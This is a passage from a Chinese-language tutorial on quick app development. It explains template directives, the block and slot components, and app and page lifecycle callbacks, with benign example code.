class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">"less"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">  <span class="selector-class">.tutorial-page</span> &#123;</span></span><br><span class="line"><span class="undefined">    flex-direction: column;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.tutorial-row</span> &#123;</span></span><br><span class="line"><span class="undefined">      width: 85%;</span></span><br><span class="line"><span class="undefined">      margin-top: 10px;</span></span><br><span class="line"><span class="undefined">      margin-bottom: 10px;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="undefined">    private: &#123;</span></span><br><span class="line"><span class="undefined">      list: [</span></span><br><span class="line"><span class="javascript">        &#123;<span class="attr">name</span>: <span class="string">'aa'</span>&#125;,</span></span><br><span class="line"><span class="javascript">        &#123; <span class="attr">name</span>: <span class="string">'bb'</span> &#125;</span></span><br><span class="line"><span class="undefined">      ]</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    onInit () &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.$page.setTitleBar(&#123; <span class="attr">text</span>: <span class="string">'指令for'</span> &#125;)</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>指令if与指令show</strong></p><ul><li><code>if</code>条件指令，是指<code>if/elif/else</code>这3个相关指令，用于控制是否增加或者删除组件；</li><li><code>show</code>指令，是指是否显示组件，用于控制组件的显示状态，并不会从DOM结构中删除</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tutorial-page"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span> <span class="attr">onclick</span>=<span class="string">"onClickShow"</span>&gt;</span>显示隐藏：<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span> <span class="attr">show</span>=<span class="string">"&#123;&#123;showVar&#125;&#125;"</span>&gt;</span>show: 渲染但控制是否显示<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span> <span class="attr">onclick</span>=<span class="string">"onClickCondition"</span>&gt;</span>条件指令：<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span> <span class="attr">if</span>=<span class="string">"&#123;&#123;conditionVar === 1&#125;&#125;"</span>&gt;</span>if: if条件<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span> <span class="attr">elif</span>=<span class="string">"&#123;&#123;conditionVar === 2&#125;&#125;"</span>&gt;</span>elif: elif条件<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span> <span class="attr">else</span>&gt;</span>else: 其余<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">"less"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">  <span class="selector-class">.tutorial-page</span> &#123;</span></span><br><span class="line"><span class="undefined">    flex-direction: column;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="undefined">    private: &#123;</span></span><br><span class="line"><span class="javascript">      showVar: <span class="literal">true</span>,</span></span><br><span class="line"><span class="undefined">      conditionVar: 1</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    onInit () &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.$page.setTitleBar(&#123; <span class="attr">text</span>: <span class="string">'指令if与指令show'</span> &#125;)</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    onClickShow () &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.showVar = !<span class="keyword">this</span>.showVar</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    onClickCondition () &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.conditionVar = ++<span class="keyword">this</span>.conditionVar % <span class="number">3</span></span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>当<code>if/elif</code>指令的值为<code>false</code>时，节点会从页面中移除，当<code>if/elif</code>指令值为<code>true</code>，组件会动态插入节点中；</li><li>当<code>show</code>指令的值为<code>true</code>时，节点可见， - 当其值为<code>false</code>时，组件不可见，但节点仍会保留在页面DOM结构中</li></ul><p><strong>组件block</strong></p><blockquote><p>block组件是表达逻辑区块的组件，没有对应的Native组件。可以使用<block>实现更为灵活的”列表/条件渲染”。如在<block>上使用for指令和if指令</block></block></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tutorial-page"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span> <span class="attr">onclick</span>=<span class="string">"toggleCityList"</span>&gt;</span>点击：控制是否显示城市<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"city"</span> <span class="attr">for</span>=<span class="string">"city in cities"</span> <span class="attr">if</span>=<span class="string">"&#123;&#123;showCityList === 1&#125;&#125;"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">text</span>&gt;</span>城市：&#123;&#123;city.name&#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">block</span> <span class="attr">if</span>=<span class="string">"&#123;&#123;city.showSpots&#125;&#125;"</span> <span class="attr">for</span>=<span class="string">"&#123;&#123;city.spots&#125;&#125;"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">text</span>&gt;</span>景点：&#123;&#123;$item.name&#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">block</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">"less"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">  <span class="selector-class">.tutorial-page</span> &#123;</span></span><br><span class="line"><span class="undefined">    flex-direction: column;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.city</span> &#123;</span></span><br><span class="line"><span class="undefined">    flex-direction: column;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">import</span> &#123;dataDirective&#125; <span class="keyword">from</span> <span class="string">'../../Common/js/data'</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="undefined">    private: &#123;</span></span><br><span class="line"><span class="undefined">      showCityList: 1,</span></span><br><span class="line"><span class="undefined">      cities: dataDirective</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    onInit () &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.$page.setTitleBar(&#123; <span class="attr">text</span>: <span class="string">'组件block'</span> &#125;)</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    toggleCityList () &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.showCityList = <span class="keyword">this</span>.showCityList === <span class="number">1</span> ? <span class="number">0</span> : <span class="number">1</span></span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>组件slot</strong></p><blockquote><p>slot节点用于向开发者额外开发的自定义ux组件中插入内容</p></blockquote><ul><li>通常自定义组件的模板中提供<code>slot</code>组件，当该组件被引入到页面组件中后，开发者可以灵活定义该自定义组件内部的子内容</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//自定义组件part1.ux</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- par1.ux --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span>&gt;</span>&#123;&#123; header &#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span>&gt;</span>&#123;&#123; footer &#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="undefined">    props: [</span></span><br><span class="line"><span class="javascript">      <span class="string">'header'</span>, <span class="string">'footer'</span></span></span><br><span class="line"><span class="undefined">    ]</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">//自定义组件使用者页面index.ux</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- index.ux --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">import</span> <span class="attr">src</span>=<span class="string">"./part1"</span>&gt;</span><span class="tag">&lt;/<span class="name">import</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">part1</span> <span class="attr">class</span>=<span class="string">"component"</span> <span class="attr">header</span>=<span class="string">"&#123;&#123;header&#125;&#125;"</span> <span class="attr">footer</span>=<span class="string">"&#123;&#123;footer&#125;&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span>&gt;</span>slot节点内容<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">part1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">  <span class="selector-class">.component</span> &#123;</span></span><br><span class="line"><span class="undefined">    flex-direction: column;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="undefined">    private: &#123;</span></span><br><span class="line"><span class="javascript">      header: <span class="string">'HEAD'</span>,</span></span><br><span class="line"><span class="javascript">      footer: <span class="string">'FOOT'</span></span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    onInit () &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.$page.setTitleBar(&#123; <span class="attr">text</span>: <span class="string">'组件slot'</span> &#125;)</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>在子组件中使用<code>slot</code>组件，使得子组件接纳调用者传入的子内容，从而动态渲染子组件，得到最终的页面</p></blockquote><h1 id="三、生命周期"><a href="#三、生命周期" class="headerlink" title="三、生命周期"></a>三、生命周期</h1><h2 id="3-1-APP的生命周期"><a href="#3-1-APP的生命周期" class="headerlink" title="3.1 APP的生命周期"></a>3.1 APP的生命周期</h2><blockquote><p>当前为APP的生命周期提供了两个回调函数：<code>onCreate</code>, <code>onDestroy</code>；可在<code>app.ux</code>中定义回调函数</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/1480597-7761414ce847115c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  natives</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">'./util/asyncNatives'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  onCreate () &#123;</span><br><span class="line">    <span class="built_in">console</span>.info(<span class="string">'Application onCreate'</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  onDestroy () &#123;</span><br><span class="line">    <span class="built_in">console</span>.info(<span class="string">'Application onDestroy'</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 暴露给所有页面，在页面中通过：this.$app.$def.method1()访问</span></span><br><span class="line">  method1 () &#123;</span><br><span class="line">    <span class="built_in">console</span>.info(<span class="string">'这是APP的方法'</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 暴露给所有页面，在页面中通过：this.$app.$def.data1访问</span></span><br><span class="line">  data1: &#123;</span><br><span class="line">    name: <span class="string">'这是APP存的数据'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  natives</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>在<code>app.ux</code>中，开发者可以做一些独立于页面的操作。比如：引入公共的JS资源，然后暴露给所有页面</li><li>在<code>app.ux</code>中，通过<code>this.$def</code>访问<code>app.ux</code>中定义的数据和方法</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.info(<span class="string">`获取：APP文件中的数据：<span class="subst">$&#123;<span class="keyword">this</span>.$def.data1.name&#125;</span>`</span>)</span><br><span class="line"><span class="built_in">console</span>.info(<span class="string">`执行：APP文件中的方法`</span>, <span class="keyword">this</span>.$def.method1())</span><br><span class="line"><span class="built_in">console</span>.info(<span class="string">`获取：manifest.json的应用名称：<span class="subst">$&#123;<span class="keyword">this</span>.$def.manifest.name&#125;</span>`</span>)</span><br><span class="line"><span class="built_in">console</span>.info(<span class="string">`获取：manifest.json的config.data的数据：<span class="subst">$&#123;<span class="keyword">this</span>.$data.name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure><blockquote><p>在<code>pageName.ux</code>中，通过<code>this.$app.$def</code>访问<code>app.ux</code>中定义的数据和方法</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.info(<span class="string">`获取：APP文件中的数据：<span class="subst">$&#123;<span class="keyword">this</span>.$app.$def.data1.name&#125;</span>`</span>)</span><br><span class="line"><span class="built_in">console</span>.info(<span class="string">`执行：APP文件中的方法`</span>, <span class="keyword">this</span>.$app.$def.method1())</span><br><span class="line"><span class="built_in">console</span>.info(<span class="string">`获取：manifest.json的应用名称：<span class="subst">$&#123;<span class="keyword">this</span>.$app.$def.manifest.name&#125;</span>`</span>)</span><br><span class="line"><span class="built_in">console</span>.info(<span class="string">`获取：manifest.json的config.data的数据：<span class="subst">$&#123;<span class="keyword">this</span>.$app.$data.name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure><p><strong>关于$app与$app.$def</strong></p><ul><li>前者代表框架为开发者暴露提供的APP对象；后者代表开发者在<code>app.ux</code>中导出的对象，放置业务相关的全局数据和方法</li><li>前者对象拥有<code>onCreate</code>, <code>onDestroy</code>生命周期；当应用启动时会执行<code>onCreate</code>方法，里面执行<code>this.variable1</code>的赋值是在<code>$app</code>对象上</li><li>后者对象中的<code>onCreate</code>, <code>onDestroy</code>方法并不会执行，作用仅仅只是把方法复制到前者对象上而已</li><li>这些全局方法在页面中：既可以通过<code>this.$app.method1()</code>调用，也可以通过<code>this.$app.$def.method1()</code>调用；不同之处在于前者可以取到之前赋值的<code>variable1</code>变量，而后者不可以取到（因为之前的赋值是在<code>$app</code>对象上执行的）</li></ul><h2 id="3-2-页面生命周期"><a href="#3-2-页面生命周期" class="headerlink" title="3.2 页面生命周期"></a>3.2 页面生命周期</h2><p><img src="https://upload-images.jianshu.io/upload_images/1480597-70b55809168cd48a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>onInit()</strong></p><blockquote><p>表示ViewModel的数据已经准备好，可以开始使用页面中的数据</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">private: &#123;</span><br><span class="line">  <span class="comment">// 生命周期的文本列表</span></span><br><span class="line">  lcList: []</span><br><span class="line">&#125;,</span><br><span class="line">onInit () &#123;</span><br><span class="line">  <span class="keyword">this</span>.$page.setTitleBar(&#123; <span class="attr">text</span>: <span class="string">'生命周期'</span> &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.lcList.push(<span class="string">'onInit'</span>)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.info(<span class="string">`触发：onInit`</span>)</span><br><span class="line">  <span class="built_in">console</span>.info(<span class="string">`执行：获取ViewModel的lcList属性：<span class="subst">$&#123;<span class="keyword">this</span>.lcList&#125;</span>`</span>)   <span class="comment">// 执行：获取ViewModel的lcList属性：onInit</span></span><br><span class="line">  <span class="comment">// $app信息</span></span><br><span class="line">  <span class="built_in">console</span>.info(<span class="string">`获取：manifest.json的config.data的数据：<span class="subst">$&#123;<span class="keyword">this</span>.$app.$data.name&#125;</span>`</span>)</span><br><span class="line">  <span class="built_in">console</span>.info(<span class="string">`获取：APP文件中的数据：<span class="subst">$&#123;<span class="keyword">this</span>.$app.$def.data1.name&#125;</span>`</span>)</span><br><span class="line">  <span class="built_in">console</span>.info(<span class="string">`执行：APP文件中的方法`</span>, <span class="keyword">this</span>.$app.$def.method1())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>onReady()</strong></p><blockquote><p>表示ViewModel的模板已经编译完成，可以开始获取DOM节点（如：this.$element(idxxx)</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">onReady () &#123;</span><br><span class="line">  <span class="keyword">this</span>.lcList.push(<span class="string">'onReady'</span>)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.info(<span class="string">`触发：onReady`</span>)</span><br><span class="line">  <span class="built_in">console</span>.info(<span class="string">`执行：获取模板节点：<span class="subst">$&#123;<span class="keyword">this</span>.$rootElement()&#125;</span>`</span>)   <span class="comment">// 执行：获取模板节点：&lt;div attr=&#123;&#125; style=&#123;"flexDirection":"column"&#125;&gt;...&lt;/div&gt;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>onShow(), onHide()</strong></p><blockquote><p>页面被切换隐藏时调用onHide()，页面被切换重新显示时调用onShow()</p></blockquote><ul><li>判断页面的显示状态，可以调用<code>ViewModel</code>的<code>$visible</code>属性：<code>true</code>表示显示，<code>false</code>表示隐藏</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">onShow () &#123;</span><br><span class="line">  <span class="keyword">this</span>.lcList.push(<span class="string">'onShow'</span>)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.info(<span class="string">`触发：onShow`</span>)</span><br><span class="line">  <span class="built_in">console</span>.info(<span class="string">`执行：获取页面显示状态属性：<span class="subst">$&#123;<span class="keyword">this</span>.$visible&#125;</span>`</span>)  <span class="comment">// true</span></span><br><span class="line">&#125;,</span><br><span class="line">onHide () &#123;</span><br><span class="line">  <span class="keyword">this</span>.lcList.push(<span class="string">'onHide'</span>)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.info(<span class="string">`触发：onHide`</span>)</span><br><span class="line">  <span class="built_in">console</span>.info(<span class="string">`执行：获取页面显示状态属性：<span class="subst">$&#123;<span class="keyword">this</span>.$visible&#125;</span>`</span>)  <span class="comment">// false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>onDestroy()</strong></p><blockquote><p>页面被销毁时调用，被销毁的可能原因有：用户从当前页面返回到上一页，或者用户打开了太多的页面，框架自动销毁掉部分页面，避免占用资源</p></blockquote><ul><li>所以，页面销毁时应该做一些释放资源的操作，如：取消接口订阅监听<code>geolocation.unsubscribe()</code></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">onDestroy () &#123;</span><br><span class="line">  <span class="built_in">console</span>.info(<span class="string">`触发：onDestroy`</span>)</span><br><span class="line">  <span class="built_in">console</span>.info(<span class="string">`执行：页面要被销毁，销毁状态：<span class="subst">$&#123;<span class="keyword">this</span>.$valid&#125;</span>，应该做取消接口订阅监听的操作: geolocation.unsubscribe()`</span>)    <span class="comment">// true，即将销毁</span></span><br><span class="line">  setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.info(<span class="string">`执行：页面已被销毁，不会执行`</span>)                <span class="comment">// 页面已销毁，不会执行</span></span><br><span class="line">  &#125;.bind(<span class="keyword">this</span>), <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>onBackPress()</strong></p><blockquote><p>当用户点击返回实体按键、左上角返回菜单、调用返回API时触发该事件</p></blockquote><ul><li>如果事件响应方法最后返回true表示不返回，自己处理业务逻辑（完毕后开发者自行调用API返回）；否则：不返回数据，或者返回其它数据：表示遵循系统逻辑：返回到上一页</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">onBackPress () &#123;</span><br><span class="line">  <span class="built_in">console</span>.info(<span class="string">`触发：onBackPress`</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// true：表示自己处理；否则默认返回上一页</span></span><br><span class="line">  <span class="comment">// return true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>返回上一页的接口API：<code>router.back()</code></p></blockquote><p><strong>onMenuPress()</strong></p><blockquote><p>当使用原生的顶部标题栏时，可以通过manifest.json中的menu属性配置是否显示右上角的菜单</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">onMenuPress () &#123;</span><br><span class="line">  <span class="keyword">this</span>.lcList.push(<span class="string">'onMenuPress'</span>)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.info(<span class="string">`触发：onMenuPress`</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>A页面的生命周期接口的调用顺序</strong></p><ul><li>打开页面A：<code>onInit()</code> -&gt; <code>onReady()</code> -&gt; 